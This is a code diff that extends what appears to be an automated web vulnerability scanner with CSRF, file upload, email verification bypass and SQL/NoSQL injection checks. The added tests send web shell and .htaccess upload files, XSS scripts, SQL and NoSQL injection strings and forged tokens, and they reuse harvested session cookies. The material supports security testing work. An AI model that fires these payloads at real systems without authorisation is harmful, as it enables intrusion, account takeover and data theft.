@@ -46,12 +46,24 @@ DESTRUCTIVE_KEYWORDS = ("delete", "destroy", "remove", "purge", "wipe",
                         "terminate", "erase", "drop")
 
 
+UPLOAD_KEYWORDS = ("upload", "file", "attach", "import", "image", "avatar",
+                   "photo", "document", "media", "cv", "resume")
+SEARCH_KEYWORDS = ("search", "query", "q", "keyword", "filter", "sort",
+                   "order", "find", "lookup", "term", "s", "text")
+REGISTRATION_KEYWORDS = ("register", "signup", "sign-up", "create-account",
+                         "join", "enroll")
+VERIFY_KEYWORDS = ("verify", "confirm", "activate", "validate", "email")
+
+
 class BusinessLogicTester:
     def __init__(self, context: dict):
         self.context = context
         self.base_url = context.get("base_url", "")
         self.endpoints = context.get("endpoints", [])
         self.auth_cookie = context.get("auth_cookie")
+        self.session_cookies = context.get("session_cookies", {})
+        self.auth_headers_ctx = context.get("auth_headers", {})
+        self.harvested_tokens = context.get("harvested_tokens", {})
         self.rate_limit = self.context.get("rate_limit") or 5
         self.semaphore = asyncio.Semaphore(self.rate_limit)
         self.findings: list[dict] = []
@@ -63,7 +75,13 @@ class BusinessLogicTester:
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/120.0.0.0 Safari/537.36",
         }
-        if self.auth_cookie:
+        # Use auth_headers from stateful_crawl if available
+        if self.auth_headers_ctx:
+            headers.update(self.auth_headers_ctx)
+        # Build cookie from session_cookies or auth_cookie
+        if self.session_cookies:
+            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session_cookies.items())
+        elif self.auth_cookie:
             if self.auth_cookie.startswith("token="):
                 headers["Authorization"] = f"Bearer {self.auth_cookie.split('=', 1)[1]}"
             else:
@@ -134,6 +152,10 @@ class BusinessLogicTester:
             ("Parameter Tampering", self._test_parameter_tampering),
             ("Rate Limit Bypass", self._test_rate_limit_bypass),
             ("HTTP Method Override", self._test_method_override),
+            ("CSRF Protection", self._test_csrf_bypass),
+            ("File Upload", self._test_file_upload),
+            ("Email Verification Bypass", self._test_email_verification_bypass),
+            ("Search/Filter Injection", self._test_search_injection),
         ]
 
         for name, method in test_methods:
@@ -1216,4 +1238,386 @@ class BusinessLogicTester:
                 except Exception as e:
                     logger.debug(f"Method override error: {e}")
 
+        return findings
+
+    # ─── 7. CSRF Protection Bypass ──────────────────────────────────
+
+    async def _test_csrf_bypass(self) -> list[dict]:
+        """Test CSRF protection on state-changing forms."""
+        findings = []
+        crawl_data = self.context.get("stateful_crawl", {})
+        forms = crawl_data.get("forms", [])
+        if not isinstance(forms, list):
+            forms = list(forms.values()) if isinstance(forms, dict) else []
+
+        state_changing = [
+            self._normalize_endpoint(ep) for ep in self.endpoints
+            if self._normalize_endpoint(ep)["method"] in ("POST", "PUT", "PATCH", "DELETE")
+        ]
+
+        targets = []
+        for f in forms[:15]:
+            url = f.get("action", f.get("url", ""))
+            if url:
+                targets.append({
+                    "url": url, "method": f.get("method", "POST"),
+                    "csrf_field": f.get("csrf_field"),
+                    "csrf_token": f.get("csrf_token"),
+                    "fields": f.get("fields", f.get("inputs", [])),
+                    "source": "form",
+                })
+        for ep in state_changing[:10]:
+            targets.append({**ep, "source": "endpoint"})
+
+        if not targets:
+            return findings
+
+        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
+            for target in targets:
+                try:
+                    result = await self._test_csrf_on_endpoint(client, target)
+                    if result:
+                        findings.append(result)
+                except Exception as e:
+                    logger.debug(f"CSRF test error on {target.get('url')}: {e}")
+        return findings
+
+    async def _test_csrf_on_endpoint(self, client, target) -> dict | None:
+        url = self._resolve_url(target["url"])
+        method = target.get("method", "POST").upper()
+
+        body = {}
+        for field in target.get("fields", [])[:20]:
+            name = field.get("name", field) if isinstance(field, dict) else str(field)
+            if isinstance(field, dict):
+                body[name] = field.get("value", "test")
+            else:
+                body[name] = "test"
+
+        # Test 1: Submit WITHOUT CSRF token
+        csrf_names = ("csrf", "csrf_token", "_token", "csrfmiddlewaretoken",
+                      "authenticity_token", "__RequestVerificationToken", "_csrf")
+        no_csrf_body = {k: v for k, v in body.items() if k not in csrf_names}
+        async with self.semaphore:
+            try:
+                resp_no_token = await client.request(method, url, data=no_csrf_body)
+            except Exception:
+                return None
+
+        if resp_no_token.status_code in range(200, 303):
+            text = resp_no_token.text.lower()
+            if not any(err in text for err in ("csrf", "forbidden", "invalid token", "419", "422")):
+                return self._make_finding(
+                    title=f"Missing CSRF Protection on {method} {urlparse(url).path}",
+                    severity="medium",
+                    url=url,
+                    method=method,
+                    parameter=None,
+                    description=(
+                        f"State-changing endpoint {method} {url} accepts requests "
+                        f"without a CSRF token. Status: {resp_no_token.status_code}."
+                    ),
+                    impact=(
+                        "Attacker can forge requests on behalf of authenticated users — "
+                        "posting ads, editing profiles, deleting content, changing passwords."
+                    ),
+                    remediation=(
+                        "Implement CSRF tokens for all state-changing operations. "
+                        "Use SameSite=Strict cookies and verify Origin/Referer headers."
+                    ),
+                    payload_used=f"{method} {url} without CSRF token",
+                    confidence=0.7,
+                    request_data={"body": no_csrf_body},
+                    response_data={"status": resp_no_token.status_code, "snippet": resp_no_token.text[:300]},
+                )
+
+        # Test 2: Submit with WRONG CSRF token
+        if target.get("csrf_field"):
+            tampered_body = dict(body)
+            tampered_body[target["csrf_field"]] = "INVALID_TOKEN_12345"
+            async with self.semaphore:
+                try:
+                    resp_bad = await client.request(method, url, data=tampered_body)
+                except Exception:
+                    return None
+
+            if resp_bad.status_code in range(200, 303):
+                text = resp_bad.text.lower()
+                if not any(err in text for err in ("csrf", "forbidden", "invalid token")):
+                    return self._make_finding(
+                        title=f"CSRF Token Not Validated on {method} {urlparse(url).path}",
+                        severity="high",
+                        url=url,
+                        method=method,
+                        parameter=target["csrf_field"],
+                        description=f"Endpoint accepts invalid CSRF token ('{target['csrf_field']}' = 'INVALID_TOKEN_12345').",
+                        impact="CSRF token present but not validated. Attacker can use any value to forge cross-origin requests.",
+                        remediation="Validate CSRF tokens server-side on every state-changing request.",
+                        payload_used=f"{target['csrf_field']}=INVALID_TOKEN_12345",
+                        confidence=0.85,
+                        request_data={"body": tampered_body},
+                        response_data={"status": resp_bad.status_code, "snippet": resp_bad.text[:300]},
+                    )
+        return None
+
+    # ─── 8. File Upload Testing ─────────────────────────────────────
+
+    async def _test_file_upload(self) -> list[dict]:
+        """Test file upload endpoints for unrestricted upload vulnerabilities."""
+        findings = []
+        crawl_data = self.context.get("stateful_crawl", {})
+        forms = crawl_data.get("forms", [])
+        if not isinstance(forms, list):
+            forms = list(forms.values()) if isinstance(forms, dict) else []
+
+        upload_forms = [f for f in forms if f.get("is_upload")]
+
+        upload_endpoints = []
+        for ep in self.endpoints:
+            norm = self._normalize_endpoint(ep)
+            url_lower = norm["url"].lower()
+            if any(kw in url_lower for kw in UPLOAD_KEYWORDS):
+                upload_endpoints.append(norm)
+
+        if not upload_forms and not upload_endpoints:
+            return findings
+
+        test_files = [
+            ("shell.php", b"<?php echo 'PHANTOM_TEST'; ?>", "application/x-php"),
+            ("shell.php.jpg", b"<?php echo 'PHANTOM_TEST'; ?>", "image/jpeg"),
+            ("test.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml"),
+            ("test.html", b"<script>alert('XSS')</script>", "text/html"),
+            (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain"),
+        ]
+
+        async with make_client(extra_headers=self.headers, timeout=20.0) as client:
+            for form in upload_forms[:5]:
+                url = self._resolve_url(form.get("action", form.get("url", "")))
+                if not url:
+                    continue
+                file_field = "file"
+                for field in form.get("fields", form.get("inputs", [])):
+                    if isinstance(field, dict) and field.get("type") == "file":
+                        file_field = field.get("name", "file")
+                        break
+
+                for filename, content, ctype in test_files:
+                    async with self.semaphore:
+                        try:
+                            resp = await client.post(url, files={file_field: (filename, content, ctype)})
+                            if resp.status_code in range(200, 303):
+                                text = resp.text.lower()
+                                if not any(msg in text for msg in ("not allowed", "invalid file", "unsupported", "file type", "extension")):
+                                    sev = "critical" if filename.endswith((".php", ".phtml")) else "high"
+                                    findings.append(self._make_finding(
+                                        title=f"Unrestricted File Upload: {filename} accepted",
+                                        severity=sev, url=url, method="POST", parameter=file_field,
+                                        description=f"Upload accepted dangerous file '{filename}' ({ctype}). Status: {resp.status_code}.",
+                                        impact="RCE via web shell, XSS via SVG/HTML, or server config override via .htaccess.",
+                                        remediation="Validate file extensions (allowlist), check magic bytes, store outside webroot, use random filenames.",
+                                        payload_used=f"Upload {filename} as {ctype}",
+                                        confidence=0.75,
+                                        request_data={"filename": filename, "content_type": ctype, "field": file_field},
+                                        response_data={"status": resp.status_code, "snippet": resp.text[:300]},
+                                    ))
+                                    break
+                        except Exception:
+                            continue
+
+            for ep in upload_endpoints[:5]:
+                url = self._resolve_url(ep["url"])
+                for field_name in ("file", "image", "upload", "attachment"):
+                    for filename, content, ctype in test_files[:2]:
+                        async with self.semaphore:
+                            try:
+                                resp = await client.post(url, files={field_name: (filename, content, ctype)})
+                                if resp.status_code in range(200, 303):
+                                    text = resp.text.lower()
+                                    if not any(msg in text for msg in ("not allowed", "invalid", "unsupported")):
+                                        findings.append(self._make_finding(
+                                            title=f"File Upload Accepted: {filename} on {urlparse(url).path}",
+                                            severity="high", url=url, method="POST", parameter=field_name,
+                                            description=f"Accepted {filename} upload via field '{field_name}'.",
+                                            impact="Potential RCE via web shell or XSS via SVG/HTML upload.",
+                                            remediation="Implement file extension allowlist and magic byte validation.",
+                                            payload_used=f"Upload {filename} via field={field_name}",
+                                            confidence=0.65,
+                                            request_data={"filename": filename, "field": field_name},
+                                            response_data={"status": resp.status_code, "snippet": resp.text[:300]},
+                                        ))
+                                        return findings
+                            except Exception:
+                                continue
+        return findings
+
+    # ─── 9. Email Verification Bypass ───────────────────────────────
+
+    async def _test_email_verification_bypass(self) -> list[dict]:
+        """Test if email verification can be bypassed."""
+        findings = []
+        verify_endpoints = []
+        for ep in self.endpoints:
+            norm = self._normalize_endpoint(ep)
+            url_lower = norm["url"].lower()
+            if any(kw in url_lower for kw in VERIFY_KEYWORDS):
+                verify_endpoints.append(norm)
+
+        if not verify_endpoints:
+            return findings
+
+        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
+            for ep in verify_endpoints[:5]:
+                url = self._resolve_url(ep["url"])
+                # Test predictable tokens
+                for token in ("1", "0", "true", "test", "admin", "00000000"):
+                    async with self.semaphore:
+                        try:
+                            test_url = f"{url}?token={token}" if "?" not in url else url
+                            resp = await client.get(test_url)
+                            if resp.status_code == 200:
+                                text = resp.text.lower()
+                                if any(w in text for w in ("verified", "confirmed", "activated", "success")):
+                                    findings.append(self._make_finding(
+                                        title="Email Verification Bypass via Predictable Token",
+                                        severity="high", url=url, method="GET", parameter="token",
+                                        description=f"Verification endpoint accepted predictable token '{token}'.",
+                                        impact="Attacker can verify arbitrary emails, bypass confirmation, create accounts with unowned emails.",
+                                        remediation="Use cryptographically random, time-limited verification tokens. Rate limit attempts.",
+                                        payload_used=f"token={token}",
+                                        confidence=0.7,
+                                        request_data={"url": test_url},
+                                        response_data={"status": resp.status_code, "snippet": resp.text[:300]},
+                                    ))
+                                    break
+                        except Exception:
+                            continue
+
+                # Test POST with manipulated params
+                for payload in [{"email": "test@test.com", "verified": True}, {"confirmed": True}]:
+                    async with self.semaphore:
+                        try:
+                            resp = await client.post(url, json=payload)
+                            if resp.status_code in range(200, 303):
+                                text = resp.text.lower()
+                                if any(w in text for w in ("verified", "confirmed", "success")):
+                                    findings.append(self._make_finding(
+                                        title="Email Verification Bypass via Parameter Injection",
+                                        severity="high", url=url, method="POST", parameter="verified/confirmed",
+                                        description="Verification endpoint accepted direct status manipulation.",
+                                        impact="Bypass email verification by sending crafted parameters.",
+                                        remediation="Never trust client-side verification status. Use server-side token validation only.",
+                                        payload_used=json.dumps(payload),
+                                        confidence=0.65,
+                                        request_data={"body": payload},
+                                        response_data={"status": resp.status_code, "snippet": resp.text[:300]},
+                                    ))
+                                    break
+                        except Exception:
+                            continue
+        return findings
+
+    # ─── 10. Search/Filter Injection ────────────────────────────────
+
+    async def _test_search_injection(self) -> list[dict]:
+        """Test search, filter, and sort parameters for injection."""
+        findings = []
+        search_endpoints = []
+        for ep in self.endpoints:
+            norm = self._normalize_endpoint(ep)
+            url_lower = norm["url"].lower()
+            if any(kw in url_lower for kw in SEARCH_KEYWORDS):
+                search_endpoints.append(norm)
+            elif any(k.lower() in ("q", "query", "search", "keyword", "filter",
+                                    "sort", "order", "order_by", "sort_by", "s", "term")
+                     for k in norm.get("params", {})):
+                if norm not in search_endpoints:
+                    search_endpoints.append(norm)
+
+        if not search_endpoints:
+            # Fallback: try common search paths
+            for path in ["/search", "/api/search", "/api/ads", "/ads",
+                         "/api/users", "/api/products", "/api/items"]:
+                search_endpoints.append({"url": path, "method": "GET", "form_fields": [], "params": {}})
+
+        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
+            for target in search_endpoints[:10]:
+                try:
+                    result = await self._test_search_endpoint(client, target)
+                    findings.extend(result)
+                except Exception as e:
+                    logger.debug(f"Search injection test error on {target.get('url')}: {e}")
+        return findings
+
+    async def _test_search_endpoint(self, client, endpoint) -> list[dict]:
+        findings = []
+        url = self._resolve_url(endpoint["url"])
+
+        test_params = ["q", "query", "search", "keyword", "filter", "sort", "order_by", "sort_by", "s"]
+        for k in endpoint.get("params", {}):
+            if k.lower() not in test_params:
+                test_params.append(k)
+
+        sqli_payloads = [
+            ("' OR '1'='1", "sqli"),
+            ("1' ORDER BY 1--", "sqli"),
+            ("1 UNION SELECT null--", "sqli"),
+            ("' AND SLEEP(3)--", "sqli_time"),
+        ]
+        nosqli_payloads = [
+            ('{"$gt":""}', "nosqli"),
+            ('{"$regex":".*"}', "nosqli"),
+        ]
+        all_payloads = sqli_payloads + nosqli_payloads
+
+        # Get baseline
+        async with self.semaphore:
+            try:
+                baseline = await client.get(url, params={"q": "test12345xyz"})
+                baseline_len = len(baseline.text)
+                baseline_status = baseline.status_code
+            except Exception:
+                return findings
+
+        sql_errors = [
+            "sql syntax", "mysql", "postgresql", "sqlite",
+            "ora-", "microsoft sql", "syntax error",
+            "unclosed quotation", "unterminated string",
+            "sqlexception", "jdbc", "hibernate",
+            "django.db", "activerecord", "sequelize",
+            "knex", "prisma", "typeorm",
+        ]
+
+        for param in test_params[:5]:
+            for payload, attack_type in all_payloads:
+                async with self.semaphore:
+                    try:
+                        resp = await client.get(url, params={param: payload})
+                        text = resp.text.lower()
+                        error_found = any(err in text for err in sql_errors)
+                        size_diff = abs(len(resp.text) - baseline_len)
+                        data_leak = size_diff > 500 and resp.status_code == 200 and baseline_status == 200
+
+                        if error_found or data_leak:
+                            severity = "critical" if error_found else "high"
+                            type_names = {"sqli": "SQL Injection", "sqli_time": "SQL Injection",
+                                          "nosqli": "NoSQL Injection"}
+                            findings.append(self._make_finding(
+                                title=f"{type_names.get(attack_type, 'Injection')} in search param '{param}'",
+                                severity=severity, url=url, method="GET", parameter=param,
+                                description=(
+                                    f"Search param '{param}' vulnerable to {attack_type}. "
+                                    f"{'SQL error in response. ' if error_found else ''}"
+                                    f"{'Significant response size difference. ' if data_leak else ''}"
+                                ),
+                                impact="Extract database contents, bypass auth, or modify/delete data via injection.",
+                                remediation="Use parameterized queries. Sanitize search/filter/sort inputs. Use ORM query builders.",
+                                payload_used=f"{param}={payload}",
+                                confidence=0.8 if error_found else 0.6,
+                                request_data={"param": param, "payload": payload, "type": attack_type},
+                                response_data={"status": resp.status_code, "error_detected": error_found,
+                                               "size_diff": size_diff, "snippet": resp.text[:500]},
+                            ))
+                            break
+                    except Exception:
+                        continue
         return findings
